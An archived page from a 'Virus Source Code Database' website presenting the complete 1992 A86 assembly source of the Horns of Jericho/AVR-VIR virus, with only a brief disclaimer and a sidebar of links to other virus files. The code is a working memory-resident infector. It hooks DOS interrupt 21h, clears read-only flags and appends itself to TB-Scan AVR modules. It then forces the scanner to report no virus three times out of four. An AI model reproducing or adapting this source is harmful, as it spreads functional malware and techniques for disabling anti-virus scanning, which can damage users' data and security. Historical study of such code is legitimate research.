<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: horns_asm</title>
<meta name="KEYWORDS" content="horns.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for horns.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="hack-83_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hack-83_asm.php">hack-83_asm</a><br>
<a href="hack_res_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hack_res_asm.php">hack_res_asm</a><br>
<a href="hack-res_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hack-res_asm.php">hack-res_asm</a><br>
<a href="hacktc2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hacktc2_asm.php">hacktc2_asm</a><br>
<a href="hacktic2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hacktic2_asm.php">hacktic2_asm</a><br>
<a href="hacktic__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hacktic__asm.php">hacktic__asm</a><br>
<a href="hacktic_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hacktic_asm.php">hacktic_asm</a><br>
<a href="hacktic_bat.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hacktic_bat.php">hacktic_bat</a><br>
<a href="halechen_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/halechen_asm.php">halechen_asm</a><br>
<a href="hamster_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hamster_asm.php">hamster_asm</a><br>
<a href="hamtlite_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hamtlite_asm.php">hamtlite_asm</a><br>
<a href="hanm2249_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hanm2249_asm.php">hanm2249_asm</a><br>
<a href="hanm2314_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hanm2314_asm.php">hanm2314_asm</a><br>
<a href="hanm2350_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hanm2350_asm.php">hanm2350_asm</a><br>
<a href="hanm2400_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hanm2400_asm.php">hanm2400_asm</a><br>
<a href="hanm2449_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hanm2449_asm.php">hanm2449_asm</a><br>
<a href="hanm2467_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hanm2467_asm.php">hanm2467_asm</a><br>
<a href="hanm2471_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hanm2471_asm.php">hanm2471_asm</a><br>
<a href="hanm2501_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hanm2501_asm.php">hanm2501_asm</a><br>
<a href="hanm2564_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hanm2564_asm.php">hanm2564_asm</a><br>
<a href="hanm2567_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hanm2567_asm.php">hanm2567_asm</a><br>
<a href="hanm2592_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hanm2592_asm.php">hanm2592_asm</a><br>
<a href="hanm2602_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hanm2602_asm.php">hanm2602_asm</a><br>
<a href="hanm2626_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hanm2626_asm.php">hanm2626_asm</a><br>
<a href="hanm2714_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hanm2714_asm.php">hanm2714_asm</a><br>
<a href="hanm2715_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hanm2715_asm.php">hanm2715_asm</a><br>
<a href="hanm2848_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hanm2848_asm.php">hanm2848_asm</a><br>
<a href="happynyb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/happynyb_asm.php">happynyb_asm</a><br>
<a href="harakiri_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/harakiri_pas.php">harakiri_pas</a><br>
<a href="hate_213_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hate_213_asm.php">hate_213_asm</a><br>
<a href="hate-213_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hate-213_asm.php">hate-213_asm</a><br>
<a href="hause_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hause_asm.php">hause_asm</a><br>
<a href="havoc_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/havoc_asm.php">havoc_asm</a><br>
<a href="hcktic2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hcktic2_asm.php">hcktic2_asm</a><br>
<a href="header_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/header_asm.php">header_asm</a><br>
<a href="heeva_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/heeva_asm.php">heeva_asm</a><br>
<a href="heevahav_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/heevahav_asm.php">heevahav_asm</a><br>
<a href="hellowen_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hellowen_asm.php">hellowen_asm</a><br>
<a href="hemlock_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hemlock_asm.php">hemlock_asm</a><br>
<a href="hh_h_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hh_h_asm.php">hh_h_asm</a><br>
<a href="hh&amp;h__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hh&h__asm.php">hh&h__asm</a><br>
<a href="hh&amp;h_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hh&h_asm.php">hh&h_asm</a><br>
<a href="hianmit_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hianmit_asm.php">hianmit_asm</a><br>
<a href="hidos_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hidos_asm.php">hidos_asm</a><br>
<a href="highland_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/highland_asm.php">highland_asm</a><br>
<a href="hiperion_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hiperion_asm.php">hiperion_asm</a><br>
<a href="hitler_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hitler_asm.php">hitler_asm</a><br>
<a href="hiv__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hiv__asm.php">hiv__asm</a><br>
<a href="hiv_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hiv_asm.php">hiv_asm</a><br>
<a href="hiv-b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hiv-b_asm.php">hiv-b_asm</a><br>
<a href="homecmng_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/homecmng_asm.php">homecmng_asm</a><br>
<a href="horns_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/horns_asm.php">horns_asm</a><br>
<a href="horsb410_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/horsb410_asm.php">horsb410_asm</a><br>
<a href="horsboo1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/horsboo1_asm.php">horsboo1_asm</a><br>
<a href="horsboo3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/horsboo3_asm.php">horsboo3_asm</a><br>
<a href="horse2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/horse2_asm.php">horse2_asm</a><br>
<a href="horse5_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/horse5_asm.php">horse5_asm</a><br>
<a href="horse8_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/horse8_asm.php">horse8_asm</a><br>
<a href="horse__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/horse__asm.php">horse__asm</a><br>
<a href="horse_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/horse_asm.php">horse_asm</a><br>
<a href="howard__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/howard__asm.php">howard__asm</a><br>
<a href="howard_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/howard_asm.php">howard_asm</a><br>
<a href="hspawn__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hspawn__asm.php">hspawn__asm</a><br>
<a href="hspawn_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hspawn_asm.php">hspawn_asm</a><br>
<a href="htc_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/htc_pas.php">htc_pas</a><br>
<a href="humgree__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/humgree__asm.php">humgree__asm</a><br>
<a href="humgreed_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/humgreed_asm.php">humgreed_asm</a><br>
<a href="hydra_0_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra_0_asm.php">hydra_0_asm</a><br>
<a href="hydra-0_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra-0_asm.php">hydra-0_asm</a><br>
<a href="hydra_1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra_1_asm.php">hydra_1_asm</a><br>
<a href="hydra-1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra-1_asm.php">hydra-1_asm</a><br>
<a href="hydra_2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra_2_asm.php">hydra_2_asm</a><br>
<a href="hydra-2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra-2_asm.php">hydra-2_asm</a><br>
<a href="hydra2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra2_asm.php">hydra2_asm</a><br>
<a href="hydra_3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra_3_asm.php">hydra_3_asm</a><br>
<a href="hydra-3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra-3_asm.php">hydra-3_asm</a><br>
<a href="hydra3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra3_asm.php">hydra3_asm</a><br>
<a href="hydra_4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra_4_asm.php">hydra_4_asm</a><br>
<a href="hydra-4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra-4_asm.php">hydra-4_asm</a><br>
<a href="hydra_5_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra_5_asm.php">hydra_5_asm</a><br>
<a href="hydra-5_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra-5_asm.php">hydra-5_asm</a><br>
<a href="hydra_6_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra_6_asm.php">hydra_6_asm</a><br>
<a href="hydra-6_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra-6_asm.php">hydra-6_asm</a><br>
<a href="hydra_7_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra_7_asm.php">hydra_7_asm</a><br>
<a href="hydra-7_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra-7_asm.php">hydra-7_asm</a><br>
<a href="hydra_8_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra_8_asm.php">hydra_8_asm</a><br>
<a href="hydra-8_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra-8_asm.php">hydra-8_asm</a><br>
<a href="hydra8_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra8_asm.php">hydra8_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

;*** HORNS OF JERICHO/AVR-VIR VIRUS SOURCE CODE ***
; (c) 1992 Crom-Cruach / TRIDENT Virus Research Group
;
; Actual virus size: 624 bytes
;
;- Research only, of course.
;- Don't be lame by changing the name, please
;
;  This virus is a high memory resident infector of AVR files.
;  It disables scanning by the AVR 3 out of 4 times (random)
;
;  Date/time are saved & it overrides the R/O flag.
;
;  MAKERES is the code called by TB-Scan
;  NEW21 is the I21 handler
;
;  Written in A86 assembly
;
;  Greetz 2 - NuKE, Phalcon/SKISM, YAM & Demoralized Youth
;  Gruntz (might be destructive) 2 all lamers, see above
;
;  I included a FAKE Avr module which doesn't detect Coffeeshop-3,
;  not to spread worldwide, ofcourse, but to show how it infects.

Start:          jmp long EndMem         ; Jump is replaced by '[Ho'

                db 'rns Of Jericho (c) 92 Crom-Cruach/Trident]'


;*** Executed by scanner, installs I21 handler ***

MakeRes:        cld
                xor di,di
                mov ds,di
                mov dx,[086]                    ; Get seg I21
                mov bp,[046C]                   ; Get random nr.
                mov ax,044A0                    ; Already installed?
                int 021
                cmp ah,0FF                      ; Yep, leave
                je Restore

                mov ah,062                      ; Get curr. PSP ofs
                int 021
                xchg bx,ax                      ; MOV AX,BX (but 1 byte)

                cmp ax,si                       ; Prog-MCB-Seg < I21 seg?
                jb Restore                      ; Yes; Quit

                dec ax
LoopMCB:        mov ds,ax

                cmp byte ptr [di],'Z'           ; [0] (but it's shorter)
                je Got_EndMCB
                add ax,[di+3]                   ; [3] (^^)
                inc ax
                jmp short LoopMCB

Got_EndMCB:     mov bx,[di+3]                   ; [3]

                cmp bx,VirPars+01000            ; Place for vir + 64K spare?
                jb Restore
                sub bx,VirPars                  ; Yep

                mov [di+3],bx                   ; [3]; Decrease memory

                add ax,bx
                sub ax,(offset StartPar-1)      ; - startpar + 1 (MCB_par)
                mov es,ax                       ; ES = seg high-mem for vir

                push cs
                pop ds
                mov cx,VirSize

HereVirOfs:     mov si,offset Start
                mov di,offset Start
                repz movsb                      ; Move vir naar high mem

                mov ds,cx                       ; cx is zero
                mov ax,[084]
                mov word ptr es:[I21Adr],ax
                mov word ptr es:[I21Adr+2],dx   ; already asked at begin
                cli
                mov word ptr [084],offset New21
                mov [086],es
                sti

Restore:
                test bp,3
                jz GoAVR                    ; Exec. AVR only 1 out of 4 times
                clc
                retf 0A                 ; Tell scanner - no virus found.
GoAVR:
                mov si,048                      ; Entry point of AVR
                push cs
                pop ds
                sub word ptr [03C],WholePars
                mov di,[03C]                    ; Size of real AVR

                pop [di+offset ReturnAVRAddr-offset Start] ;Save addr. scanner
                pop [di+offset ReturnAVRAddr-offset Start+2]

                push cs                         ; New AVR-return address
                add di,offset AfterAVR-offset Start
                push di
                mov word ptr [si],020CDh    ; Restore orig. AVR bytes
Min2Org:        mov byte ptr [si+2],090     ; (Now: return to DOS I20)
Min1Org:        jmp si


;*** Misc. procedures ***

ReadFile:       push ax                         ; Read part of AVR file
                mov ah,03F
                mov dx,offset RdBuf
                int 021                         ; bx must be handle
                cmp ax,cx                       ; Return carry if read<asked
                pop ax
                ret

SaveRegs:       mov cs:SaveDs,ds
                push cs
                pop ds
                mov SaveAx,ax
                mov SaveCx,cx
                mov SaveDx,dx
                mov SaveSi,si
                mov SaveDi,di
                ret

GetRegs:        push cs
                pop ds
                mov ax,SaveAx
                mov cx,SaveCx
                mov dx,SaveDx
                mov si,SaveSi
                mov di,SaveDi
                mov ds,SaveDs
                ret

MakeSum:        push bx                 ; save handle
SumLoop:        xchg bx,ax              ;mov bx,ax; but in 1 byte
                shl bx,1
                lodsb
                add ax,bx
                mov ah,bh
                test ah,080
                jz NoXor
                xor ax,0A097
NoXor:          loop SumLoop
                pop bx
                ret

GoBegFile:      push cx
                push dx
                mov ax,04200            ; Go to beg. of file
                xor cx,cx
                cwd                     ; MOV DX,0 1 byte (AX<8000)
                int 021                 ; BX must be file handle
                pop dx
                pop cx
                ret


;*** Saved data - The filehandle (FFFF = no file)

FHandle         dw 0FFFF




;****** NEW I21 HANDLER ******

New21:

;--- If ax = 44A0: Ah->FF; is sign: Vir already installed ---

                cmp ax,044A0
                jne NoF
                cbw             ; Al is signed; AH -> FF
                iret

;--- On 3D-Open, check if file is AVR, & if so, save handle ---

NoF:            cmp ah,3Dh              ; Read?
                jne Close
                test al,3
                jnz Go21                ; He wanted to write as well!
                cmp cs:FHandle,0FFFF
                jne Go21                ; Already a file traced
                push ds
                call SaveRegs
                pop ds
                cld
                mov si,dx
                cmp word ptr [si],':C'          ; file on c-drive?
                jne JDos                      ; No; quit
SrchEnd:        lodsb                           ; end of filename
                cmp al,0
                jne SrchEnd
                cmp word ptr [si-5],'A.'        ; .A?
                jne JDos
                cmp word ptr [si-3],'RV'        ; VR?
                jne JDos

;*** Clear R/O flag ***
                mov ax,04300                    ; Get file attr.
                int 021
                jc JDos
                mov cs:Attr,cx
                test cl,1
                jz IsOk                         ; No R/O flag set
                mov ax,04301
                and cl,0FE                      ; Clear flag
                int 021
                jc JDos
IsOk:
                call GetRegs
                or al,2                         ; Read & write!
                int 021                         ; Try opening file
                pushf
                push ax
                push cx
                mov ax,04301
                mov cx,cs:Attr
                int 021
                pop cx
                pop ax
                popf
                jnc Save_Handle                   ; Err, Quit&Try open w/o write
JDos:           jmp short Go2Dos
Save_Handle:    mov cs:FHandle,ax
                retf 2


;--- On 3E-Close, infect AVR if not already infected ---

Close:          cmp ah,03E                      ; Close?
                jne Go21                        ; No, quit
                cmp bx,cs:FHandle               ; Is traced AVR module?
                je SameFile                     ; No, quit
Go21:           jmp i21Jmp
SameFile:       mov word ptr cs:FHandle,0FFFF   ; Clear FHandle
                call SaveRegs
                call GoBegFile
                mov cx,050
                call ReadFile
                jb Go2Dos                    ; Can't be <50h bytes.

;Test if file is a good AVR file
                mov si,dx                       ; ofs. RdBuf

                cmp byte ptr [si+048],0E9       ; Infected?
                je Go2Dos                            ; Yeah, quit

                cmp byte ptr [si+041],0         ; Check first 0
Ne_Ret:         jne Go2Dos
                cmp word ptr [si+042],1         ; Check 1 0
                jne Go2Dos

;Write jump to end-of-AVR
                mov ax,word ptr [si+048]        ; Save org. bytes
                mov [Min2Org-2],ax
                mov al,byte ptr [si+04A]
                mov [Min1Org-1],al

                mov ax,word ptr [si+03C]        ; Length of AVR
                test al,0F                              ; Not /16?
                jz No_ret
Go2Dos:         jmp short Quit2Dos

No_Ret:
                add word ptr [si+03C],WholePars ; Add size of virus

                mov [HereVirOfs+1],ax           ; Write ofs of virus (for move)

                mov di,ax
                sub di,cx                       ; DI = bytes still to read

                mov byte ptr [si+048],0E9
                add ax,offset MakeRes-offset Start-048-3 ; set jmp 2 vir
                mov [si+049],ax              ; jump on start
                mov [offset ReturnAVR-2],ax             ; restore-jump

                call GoBegFile

                mov ah,040                      ; Write header, with JMP added
                int 021                         ; cx still 50h, dx still RdBuf

                xor ax,ax                       ; chksum 0


;*** CSUM Calculate. Here of file - result in AX ***

LoopCode:
                call MakeSum
                mov si,dx
                mov cx,di
                jcxz DoneRead

ReadMore:       cmp cx,0100             ; Buffer = 100h bytes
                jna NoMore
                mov cx,0100
NoMore:         sub di,cx
                call ReadFile
                jmp short LoopCode


;*** And of virus itself ***

DoneRead:       mov si,offset Start
                mov cx,offset WholePars-2
                mov dx,si
                call MakeSum

                mov word ptr [si],ax      ; Save sum
                mov ah,040
                mov cx,offset WholePars
                int 021

;*** And preserve file date/time

                mov ax,05700
                int 021
                mov ax,05701
                int 021

Quit2Dos:       call GetRegs                    ; Go interrupt, restore regs
I21Jmp:         db 0EA                          ; JMP FAR
I21Adr          dw 0,0


;*** After the execution of the org. AVR, it jumps to here ***

AfterAVR:       add word ptr cs:[03C],WholePars ; restore to AVR+Virsize
                mov byte ptr cs:[048],0E9       ; JMP long
                mov word ptr cs:[049],01234     ; Filled next infection
ReturnAVR:      db 0EA                          ; jump back to scanner

EndVir:                                 ;*** END OF WRITTEN VIRUS ***

ReturnAVRAddr   dw 0,0

RdBuf           db 0100 dup (?)         ;*** ... DATA ONLY IN MEMORY ***

SaveAx          dw 0
SaveCx          dw 0
SaveDx          dw 0
SaveSi          dw 0
SaveDi          dw 0
SaveDs          dw 0

ReadSize        dw 0

Attr            dw 0


EndMem:                                 ; *** END OF MEMORY DATA ***

;*** This code is only executed for installing the 'mother' into memory.
; It is not a real part of the virus code.

                mov byte ptr [Start],'['
                mov word ptr [Start+1],'oH'
                mov ax,0FFFF
                int 021
                cmp ah,0FE
                je NoInit
                mov ax,03521
                int 021
                mov [I21Jmp+1],bx
                mov [I21Jmp+3],es
                mov ax,02521
                mov dx,offset New21
                int 021
                mov ax,03100
                mov dx,VirPars+010      ; Also PSP required
                int 021
NoInit:         ret


VirSize         equ (offset EndVir-offset Start)

VirPars         equ (offset EndMem-offset Start+0F) shr 4 ; pars of memory required

StartPar        equ offset Start shr 4


WholePars       equ ((offset EndVir-offset Start+2+0F) shr 4) shl 4
    ; whole pars, 2 bytes CSUM

</textarea></td></tr></table></body></html>
